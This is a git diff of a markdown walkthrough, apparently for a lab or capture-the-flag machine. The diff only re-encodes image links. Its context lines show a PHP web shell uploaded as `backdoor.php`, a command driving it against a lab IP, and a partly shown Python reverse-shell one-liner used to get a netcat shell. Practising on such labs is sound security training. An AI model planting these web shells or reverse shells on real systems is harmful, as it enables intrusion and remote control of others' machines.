@@ -80,10 +80,10 @@ $ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.
 # Question
 ---
 
-![](Pasted image 20250219162424.png)
+![](Pasted%20image%2020250219162424.png)
 Let's begin by going into the application:
 
-![](Pasted image 20250219162641.png)
+![](Pasted%20image%2020250219162641.png)
 
 
 We can upload files, let's upload a file named `backdoor.php` with the following contents:
@@ -92,7 +92,7 @@ We can upload files, let's upload a file named `backdoor.php` with the following
 <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
 ```
 
-![](Pasted image 20250219162652.png)
+![](Pasted%20image%2020250219162652.png)
 
 Let's use this python script to interact with our webshell:
 
@@ -128,7 +128,7 @@ python3 web_shell.py -t http://10.129.27.149:3001/uploads/backdoor.php -o yes
 
 We get a shell:
 
-![](Pasted image 20250219162817.png)
+![](Pasted%20image%2020250219162817.png)
 
 We can try moving it to netcat, let's set up a listener and use the following:
 
@@ -137,7 +137,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 
 We get this:
-![](Pasted image 20250219164104.png)
+![](Pasted%20image%2020250219164104.png)
 
 We got a shell in netcat, now, let's read the hostname:
 
